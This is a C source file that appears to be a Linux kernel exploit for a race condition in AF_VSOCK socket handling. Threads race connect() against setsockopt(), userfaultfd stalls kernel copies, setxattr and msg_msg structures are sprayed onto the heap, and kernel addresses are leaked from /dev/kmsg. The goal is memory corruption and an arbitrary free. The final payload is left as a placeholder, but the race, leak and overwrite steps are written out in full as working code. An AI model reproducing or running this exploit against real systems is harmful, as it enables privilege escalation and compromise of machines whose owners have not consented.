#define _GNU_SOURCE


#include <stdlib.h>
#include <time.h>
#include <errno.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <pthread.h>
#include <sys/mman.h>
#include <semaphore.h>
#include <sys/ioctl.h>
#include <stdatomic.h>
#include <sys/socket.h>
#include <linux/vm_sockets.h>
#include <linux/userfaultfd.h>



#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50
#define PAGE_SIZE		4096
#define PAYLOAD_SZ 		40
#define ARB_READ_SZ 	6096
#define MAGICPAGE1		((void*)0x444342414000)
#define MAGICPAGE2		((void*)0x444342415000)
#define SPRAY_DATA_PAGE ((void*)0x444342416000) // why this addres? npi


int vsock = -1;
int tfail = 0;
int msqid;
pthread_barrier_t barrier;


void send_msg(){
	int result;
	int msqid;
    struct msgbuf {
        long mtype;       /* message type, must be > 0 */
        char mtext[16];    /* message data */
    } msgb;

	msqid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
	msgb.mtype = 16;
	strcpy(msgb.mtext, "###############");
	result = msgsnd(msqid, (void *) &msgb, sizeof(msgb.mtext), IPC_NOWAIT);
	if(result != 0) {
    	fprintf(stderr, "msgsnd failed! %d\n", errno);
	}

}


typedef struct {
	sem_t* sem;	
	long lag_nsec;
} connecterarg;

void *th_connect(void *arg)
{
	int ret = -1;
	connecterarg* carg = (connecterarg*)arg;

	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};


	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));

	sem_wait(carg->sem);

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));


	send_msg();
	return NULL;
}


typedef struct {
	long lag_nsec;
	sem_t* sem;	
	int i;
	unsigned long write_val;
} writerarg;

void *th_setsockopt(void *arg)
{
	int ret = -1;
	writerarg* warg = (writerarg*)arg;

	struct timespec tp;
	unsigned long size = 0;



	clock_gettime(CLOCK_MONOTONIC, &tp);
	size = tp.tv_nsec;


	sem_wait(warg->sem);
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&size, sizeof(unsigned long));

	return NULL;
}



void *th_setsockopt_overwrite(void *arg)
{
        int ret = -1;
        writerarg* warg = (writerarg*)arg;
        
        int i = warg->i;
        struct timespec tp;
        unsigned long size = 0;


        clock_gettime(CLOCK_MONOTONIC, &tp);
        size = tp.tv_nsec;

		unsigned long val = warg->write_val;

		sem_wait(warg->sem);
        setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                                                &val, sizeof(unsigned long)); ;

        return NULL;
}


void *th_connect_overwrite(void *arg)
{
	int ret = -1;
	connecterarg* carg = (connecterarg*)arg;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};


	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));

	sem_wait(carg->sem);
	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));

	send_msg();
	return NULL;
}

typedef struct {
	void* futureaddr;
} gaterarg;

void *th_gater(void* arg)
{
	gaterarg* garg = (gaterarg*)arg;
	int ret = -1;
	unsigned long val = 0x12345678;
	ret = setsockopt(vsock, AF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE, &val, sizeof(unsigned long));
	ret = setsockopt(vsock, AF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE, garg->futureaddr, sizeof(uint64_t));
	if(ret != 0)
		err_exit("[-] th_gater\n");

	return NULL;
}

void *parse_kmsg(FILE *fp, char *rbx, char *rcx)
{
	size_t len = 0;
	ssize_t readl;
	char *pch = NULL;
	int found = 0;
	char *rbx_string = "RBX";
	char *line = NULL;
	while(((readl = getline(&line, &len, fp)) != 0) && found == 0){
//		printf("read ret %d\n", read);
		pch = strstr(line, rbx_string);
		if(pch){
			strncpy(rbx, pch+5, 16);
			strncpy(rcx, pch+27, 16);
			rbx[16] = '\0';
			rcx[16] = '\0';

			char rbx_null[17];
			strcpy(rbx_null, "0000000000000000");
			if(strncmp(rbx, rbx_null, 16) != 0){
				found++;
			}
		}
	}

	return NULL;

}


typedef struct {
	int faultfd;
	struct uffd_msg *fmsg;
	void* spray_data;
} xattrarg;

void *th_userfault_xattr(void *arg)
{
	xattrarg* xarg = (xattrarg*)arg;
		// wait on userfault
	int faultfd = xarg->faultfd;
	int nread;
	struct uffd_msg *fmsg = xarg->fmsg;
	void *spray_data = xarg->spray_data;

	nread = read(faultfd, fmsg, sizeof(*fmsg));
	if (nread < 0) {
		err_exit("[-] xattr userfault read\n");
	} else if (nread == 0) {
		err_exit("[-] xattr EOF for userfault fd?\n");
	}

	if (fmsg->event != UFFD_EVENT_PAGEFAULT) {
		err_exit("[-] xattr got weird event\n");
	}

	if ((fmsg->arg.pagefault.address < (uint64_t)spray_data+PAGE_SIZE*4) || (fmsg->arg.pagefault.address >= (uint64_t)(spray_data+PAGE_SIZE*5))) {
		err_exit("[-] xattr Got strange address for fault\n");
	}

	printf("[+] xattr got the fault\n");
	while(0){
		continue;
	}
	// Don't handle pagefault! this way xattr created spray is kept.
}

typedef struct {
	void* spray_data;
} sprayarg;

void th_xattr_heap_spraying(void *arg)
{
	sprayarg* xarg = (sprayarg*)arg;

	void *addr = xarg->spray_data;
    size_t size = 40 +40; // 40 for payload + extra to provoke userfault

	//setxattr
	syscall(188, "./", "exp", addr, size);
}



void prepare_payload(void *spray_data) // void prepare_payload(void *spray_data, unsigned long kaddr)
{
	//struct msg_msg *msg_ptr;
	void *msg_ptr;

	void *xattr_addr;

	xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

	//Don't touch the second part to avoid breaking page fault delivery 
	// spray_data -> pointer
    memset(spray_data, 0xa5, PAGE_SIZE * 4);

    printf("[+] adapt the msg_msg spraying payload:\n");

    // WRITE PAYLOAD HERE

}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };
	FILE *fp;
	
	char rbx_good[17];
	char rcx_good[17];
	char rbx_corr[17];
	char rcx_corr[17];

	int faultfd = -1;
	int xattr_faultfd = -1;
	pthread_t wtid;
	pthread_t ctid;
	pthread_t gtid;
	pthread_t xtid;


	struct uffdio_api ufapi;
	struct uffdio_register ufreg;
	struct uffd_msg fmsg;
	struct uffdio_zeropage go;

	struct uffdio_api xattr_ufapi;
	struct uffdio_register xattr_ufreg;
	struct uffd_msg xattr_fmsg;
	struct uffdio_zeropage xattr_go;

	sem_t writer_sem;
	sem_t connecter_sem;
	writerarg warg;
	connecterarg carg;
	gaterarg garg;
	xattrarg xarg;
	void *magicaddr;
	void *spray_data;
	ssize_t nread;

	fp = fopen("/dev/kmsg", "r");
	int res = fseek(fp, 0, SEEK_END);

	if (fp == NULL)
		err_exit("[-] open /dev/kmsg");

	printf("[+] /dev/kmsg is opened\n");

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");


	

	///////////////////////////////////////////////////////////USERFAULTFD XATTR //////////////////////////////////////

	xattr_faultfd = syscall(323, 0);
	if (xattr_faultfd < 0)
		err_exit("[-] faultfd\n");

	xattr_ufapi.api = UFFD_API;
	xattr_ufapi.features = 0;

	if (ioctl(xattr_faultfd, UFFDIO_API, &xattr_ufapi) == -1) {
		err_exit("[-] xattr ioctl UFFDIO_API\n");
	}

	spray_data = mmap(SPRAY_DATA_PAGE, PAGE_SIZE*5, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (spray_data == MAP_FAILED) {
		err_exit("[-] xattr mmap\n");
	}
	printf("[+] spray_data addr %p\n", spray_data);

	prepare_payload(spray_data);

	xattr_ufreg.range.start = (uint64_t)(spray_data + PAGE_SIZE*4);
	xattr_ufreg.range.len = PAGE_SIZE;
	xattr_ufreg.mode = UFFDIO_REGISTER_MODE_MISSING;

	if (ioctl(xattr_faultfd, UFFDIO_REGISTER, &xattr_ufreg)) {
		err_exit("[-] xattr ioctl UFFDIO_REGISTER\n");
	}

	xarg.faultfd = xattr_faultfd;
	xarg.fmsg = &xattr_fmsg;
	xarg.spray_data = spray_data;
	if (pthread_create(&xtid, NULL, th_userfault_xattr, (void*)&xarg)) {
		err_exit("[-] userfault_xattr pthread_create\n");
	}

	printf("[+] thread for xattr userfault handling created\n");


	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&size, sizeof(unsigned long));


	faultfd = syscall(323, 0);
	if (faultfd < 0)
		err_exit("[-] faultfd\n");

	ufapi.api = UFFD_API;
	ufapi.features = 0;

	if (ioctl(faultfd, UFFDIO_API, &ufapi) == -1) {
		err_exit("[-] ioctl UFFDIO_API\n");
	}

	magicaddr = mmap(MAGICPAGE1, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (magicaddr == MAP_FAILED) {
		err_exit("[-] mmap\n");
	}

	ufreg.range.start = (uint64_t)magicaddr;
	ufreg.range.len = PAGE_SIZE;
	ufreg.mode = UFFDIO_REGISTER_MODE_MISSING;

	if (ioctl(faultfd, UFFDIO_REGISTER, &ufreg)) {
		err_exit("[-] ioctl UFFDIO_REGISTER\n");
	}

	if (sem_init(&writer_sem, 0, 0)) {
		err_exit("[-] writer_sem init\n");
	}

	if (sem_init(&connecter_sem, 0, 0)) {
		err_exit("[-] connecter_sem init\n");
	}

	carg.sem = &connecter_sem;
	if (pthread_create(&ctid, NULL, th_connect, (void*)&carg)) {
		err_exit("[-] connecter pthread_creat\n");
	}

	// start writer	
	warg.sem = &writer_sem;
	if (pthread_create(&wtid, NULL, th_setsockopt, (void*)&warg)) {
		err_exit("[-] writer pthread_create\n");
	}

	// start gater
	garg.futureaddr = magicaddr;
	if (pthread_create(&gtid, NULL, th_gater, (void*)&garg)) {
		err_exit("[-] writer pthread_create\n");
	}

	// wait on userfault
	nread = read(faultfd, &fmsg, sizeof(fmsg));
	if (nread < 0) {
		err_exit("[-] userfault read\n");
	} else if (nread == 0) {
		err_exit("[-] EOF for userfault fd?\n");
	}

	if (fmsg.event != UFFD_EVENT_PAGEFAULT) {
		err_exit("[-] got weird event\n");
	}

	if ((fmsg.arg.pagefault.address < (uint64_t)magicaddr) || (fmsg.arg.pagefault.address >= (uint64_t)(magicaddr+PAGE_SIZE))) {
		err_exit("[-] Got strange address for fault\n");
	}


	printf("[+] first race completed\n");
	
	sem_post(&connecter_sem);
	
	sem_post(&writer_sem);



	// specify fault as handled
	go.range.start = (uint64_t)magicaddr;
	go.range.len = PAGE_SIZE;
	go.mode = 0;

	if (ioctl(faultfd, UFFDIO_ZEROPAGE, &go)) {
		err_exit("[-] ioctl UFFDIO_ZEROPAGE");
	}

	if (go.zeropage < 0) {
		err_exit("[-] got zeropage error\n");
	}
	else if (go.zeropage != PAGE_SIZE) {
		err_exit("[-] got strange amount zeroed\n");
	}


	ret = pthread_join(gtid, NULL);
	if (ret != 0)
		err_exit("[-] pthread_join #0");

	ret = pthread_join(wtid, NULL);
	if (ret != 0)
		err_exit("[-] pthread_join #0");

	ret = pthread_join(ctid, NULL);
	if (ret != 0)
		err_exit("[-] pthread_join #0");



	parse_kmsg(fp, rbx_good, rcx_good);
	//printf("[+] RBX: %s\n", rbx_corr);				// vsock_sock kernel address
	printf("[+] RCX, good msg_msg: 0x%s\n", rcx_good);	// Freed virtio_vsock_sock kernel address

	char rcx_good_lsb [9];
	memcpy(rcx_good_lsb, &rcx_good[8],8);
	char *ptr;

	unsigned long good_msg_addr = strtol(rcx_good_lsb, &ptr, 16);

	printf("[ ] looping for overwriting ...\n");
	fseek(fp, 0, SEEK_END);
	close(faultfd);




//////////////////////////////////////////////////////////////// OVERWRITE ///////////////////////////////////////////////////////////////


	faultfd = syscall(323, 0);
	if (faultfd < 0)
		err_exit("[-] faultfd\n");

	ufapi.api = UFFD_API;
	ufapi.features = 0;

	if (ioctl(faultfd, UFFDIO_API, &ufapi) == -1) {
		err_exit("[-] ioctl UFFDIO_API\n");
	}

	magicaddr = mmap(MAGICPAGE2, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (magicaddr == MAP_FAILED) {
		err_exit("[-] mmap\n");
	}

	ufreg.range.start = (uint64_t)magicaddr;
	ufreg.range.len = PAGE_SIZE;
	ufreg.mode = UFFDIO_REGISTER_MODE_MISSING;

	if (ioctl(faultfd, UFFDIO_REGISTER, &ufreg)) {
		err_exit("[-] ioctl UFFDIO_REGISTER\n");
	}

	if (sem_init(&writer_sem, 0, 0)) {
		err_exit("[-] writer_sem init\n");
	}

	if (sem_init(&connecter_sem, 0, 0)) {
		err_exit("[-] connecter_sem init\n");
	}

	carg.sem = &connecter_sem;
	if (pthread_create(&ctid, NULL, th_connect_overwrite, (void*)&carg)) {
		err_exit("[-] connecter pthread_creat\n");
	}

	// start writer	
	warg.sem = &writer_sem;
	warg.write_val = good_msg_addr;
	if (pthread_create(&wtid, NULL, th_setsockopt_overwrite, (void*)&warg)) {
		err_exit("[-] writer pthread_create\n");
	}

	// start gater
	garg.futureaddr = magicaddr;
	if (pthread_create(&gtid, NULL, th_gater, (void*)&garg)) {
		err_exit("[-] writer pthread_create\n");
	}

	// wait on userfault
	nread = read(faultfd, &fmsg, sizeof(fmsg));
	if (nread < 0) {
		err_exit("[-] userfault read\n");
	} else if (nread == 0) {
		err_exit("[-] EOF for userfault fd?\n");
	}

	if (fmsg.event != UFFD_EVENT_PAGEFAULT) {
		err_exit("[-] got weird event\n");
	}

	if ((fmsg.arg.pagefault.address < (uint64_t)magicaddr) || (fmsg.arg.pagefault.address >= (uint64_t)(magicaddr+PAGE_SIZE))) {
		err_exit("[-] Got strange address for fault\n");
	}

	printf("[+] got the 2nd fault\n");

	
	sem_post(&connecter_sem);
	
	sem_post(&writer_sem);



	// specify fault as handled
	go.range.start = (uint64_t)magicaddr;
	go.range.len = PAGE_SIZE;
	go.mode = 0;

	if (ioctl(faultfd, UFFDIO_ZEROPAGE, &go)) {
		err_exit("[-] ioctl UFFDIO_ZEROPAGE");
	}

	if (go.zeropage < 0) {
		err_exit("[-] got zeropage error\n");
	}
	else if (go.zeropage != PAGE_SIZE) {
		err_exit("[-] got strange amount zeroed\n");
	}


	ret = pthread_join(gtid, NULL);
	if (ret != 0)
		err_exit("[-] pthread_join #0");

	ret = pthread_join(wtid, NULL);
	if (ret != 0)
		err_exit("[-] pthread_join #0");

	ret = pthread_join(ctid, NULL);
	if (ret != 0)
		err_exit("[-] pthread_join #0");


	parse_kmsg(fp, rbx_corr, rcx_corr);

	//printf("[+] RBX: %s\n", rbx_corr);				    // vsock_sock kernel address
	printf("[+] RCX, corrupted msg_msg: 0x%s\n", rcx_corr);	// Freed virtio_vsock_sock kernel address


	/////////////////////////////////////////////////////////////////////////////////////////////////////
	// Arbitrary free here, 
	struct msgbuf {
        long mtype;       /* message type, must be > 0 */
        char mtext[16];    /* message data */
    } msgb;

    msgb.mtype = 16;

	ret = msgrcv(msqid, (void *) &msgb, 16, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
	if(ret < 0){
		err_exit("[-] error receiving msg");
	}
	printf("received msg: %s, size %d\n", msgb.mtext, ret);
	/////////////////////////////////////////////////////////////////////////////////////////////////////


	return 0;
}
